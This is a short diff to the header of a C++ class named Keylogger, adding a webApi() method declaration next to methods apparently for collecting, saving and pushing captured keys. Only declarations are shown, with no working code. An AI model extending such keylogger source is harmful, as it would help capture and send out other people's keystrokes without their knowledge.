@@ -10,6 +10,7 @@ class Keylogger
 		std::string getKeys();
 		void saveKeys();
 		void pushKeys();
+		void webApi();
 
 	private:
 		std::string _keys;
